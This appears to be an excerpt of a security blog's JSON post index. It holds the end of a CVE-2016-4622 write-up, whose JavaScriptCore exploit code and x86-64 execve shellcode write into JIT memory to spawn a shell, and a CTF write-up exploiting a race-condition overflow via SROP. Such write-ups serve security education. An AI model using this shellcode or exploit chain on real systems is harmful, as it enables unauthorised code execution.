that region using the primitives.  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  function jit_funx() { function target(x) { return x; } for (var i = 0; i \u0026lt; 1000; i++) { target(i); } return target; } // var pwn = jit_funx(); var pwn_addr = addrof(pwn); var rwx_addr = memory.read64(Add(pwn_addr, 24)); var jitCodeAddr = memory.read64(Add(rwx_addr, 24)); var shellcode = [ 0x48, 0x31, 0xc0, 0x50, 0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57, 0x48, 0x89, 0xe7, 0x50, 0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0xb0, 0x3b, 0x0f, 0x05, ];    Using the leak, write the shellcode to that address and then call the function.  1 2 3  var code = memory.read64(Add(jitCodeAddr, 32)); memory.write(code, shellcode); pwn();    This will execute the shellcode and pop a shell.   Here is the link for the exploit script.\n","date":"2024-01-02T06:19:43+05:30","permalink":"https://sanjayvardhan.github.io/posts/notes-on-cve-2016-4622/","title":"Notes on CVE-2016-4622"},{"content":"tl;dr\n Double fetch race Condition in store_note function. overwrite size during race window to get buffer overflow. Do SROP for execve(\u0026quot;/bin/sh\\x00\u0026quot;)  Challenge Points: 856 No. of solves: 18 Author: spektre\nChallenge description Heard of heap notes? this ain\u0026rsquo;t one.\nInitial analysis The binary is standard x86 64-bit Dynamic stripped executable.\nThe mitigations enabled on the binary are as follows:\n1 2 3 4 5  Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)   On reversing the binary, we can see there are 6 options avaiable:\n Store Note - stores note in the shared memory. Delete Note - memset note to 0. Print Note - prints the note. Upgrade Note - Upgrade size of the note. Encrypt/Decrypt - Encrypt note and store note in shared memory. Exit  The binary operates with two threads, one thread does all the store, delete, print, upgrade and encrypt functionality and the other thread checks size of the note and memcpy into buf[64] if size is less than 64 once store_note is done.\nVulnerability store_note in thread 1 :\n1 2 3 4 5 6 7 8 9 10 11  void store_note(sh_mem *ptr) { syscall(SYS_write, 1, \u0026#34;Enter Note ID: \u0026#34;, 15); read_input(ptr-\u0026gt;id, 8); syscall(SYS_write, 1, \u0026#34;Enter Note Name: \u0026#34;, 17); read_input(ptr-\u0026gt;name, 16); syscall(SYS_write, 1, \u0026#34;Enter Note Size: \u0026#34;, 17); scanf(\u0026#34;%d\u0026#34;, \u0026amp;ptr-\u0026gt;size); syscall(SYS_write, 1, \u0026#34;Enter Note Content: \u0026#34;, 20); read_input(ptr-\u0026gt;buffer, ptr-\u0026gt;size); ptr-\u0026gt;size_input = true; }   Functions running on thread 2 :\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  void process(sh_mem *ptr){ sleep(2); if (ptr-\u0026gt;size \u0026gt; 64 || ptr-\u0026gt;size \u0026lt; 0) { syscall(SYS_write, 1, \u0026#34;Size Limit Exceeded\\n\u0026#34;, 20); exit(0); } encrypt_text(ptr); char msg[64]; sleep(1); syscall(SYS_write, 1, \u0026#34;Sent!\\n\u0026#34;, 6); memcpy(msg, ptr-\u0026gt;buffer, ptr-\u0026gt;size); } void *thread2(sh_mem *ptr) { while(true){ ptr-\u0026gt;size_input = false; while (ptr-\u0026gt;size_input == false) { } process(ptr); ptr-\u0026gt;thread2_done = true; } }   thread2() starts once store_input is done. If you look closely, we can see there is a Race Condition in process() function which Double fetches size for size check and memcpy, with a sleep() in between. Which gives us enough time to overwrite the size in the race window using Upgrade().\nUpgrade() :\n1 2 3 4 5 6 7 8 9 10  void upgrade_note(sh_mem *ptr) { if(ptr-\u0026gt;thread2_done == false){ syscall(SYS_write, 1, \u0026#34;Error\\n\u0026#34;, 6); return; } syscall(SYS_write, 1, \u0026#34;Enter Note Size: \u0026#34;, 17); scanf(\u0026#34;%d\u0026#34;, \u0026amp;ptr-\u0026gt;size); syscall(SYS_write, 1, \u0026#34;Enter Name: \u0026#34;, 12); read_input(ptr-\u0026gt;name, 0x10); }   we can only use upgrade if thread2() completes executing as it checks if ptr-\u0026gt;thread2_done is false. in thread2(), ptr-\u0026gt;size_input is set to false every time loop, but ptr-\u0026gt;thread2_done is not reset, so we can use upgrade_note() during store_note() anytime after the first loop is done. This allows us to overwrite size during the race window to get buffer overflow.\nExploitation The plan for the exploit is as follows:\n Use encrypt_decrypt() function to dump the encrypted payload into the shared memory. store_note() once to get ptr-\u0026gt;thread2_done == true store_note again and overwrite size using upgrade() during the race window to get buffer overflow Now in the rop chain read \u0026ldquo;/bin/sh\\x00\u0026rdquo; into bss using read_input Now set rax to 0x3b using alarm() (prep for SROP to trigger execve(\u0026quot;/bin/sh\\x00\u0026quot;)) Using alarm() twice returns the number of seconds remaining. so first call alarm(0x3b) and then alarm(0). Now setup SigreturnFrame.  You can find the full exploit here\nYou can also solve this using ret2libc instead of SROP. The shared memory allocated is right before ld.so page, which has a pointer to an mmaped region. That mmaped region is located right below libc mapping. which gives us enough info to get libc base address, calculate execve address and then do execve(\u0026quot;/bin/sh\\x00\u0026quot;).\nConclusion This is my first time making challenge for a ctf. I had a lot of fun and learnt a lot while making this challenge. Hope you had fun while solving as well.\nFlag: bi0sCTF{D3j4_vu!_1v3_ju5t_b33n_1n_th15_pl4c3_b3f0r3_0b91342067c4}\n","date":"2023-01-24T05:01:57Z","permalink":"https://sanjayvardhan.github.io/posts/bi0sctf22-n0tes/","title":"bi0sCTF22 - n0tes"}]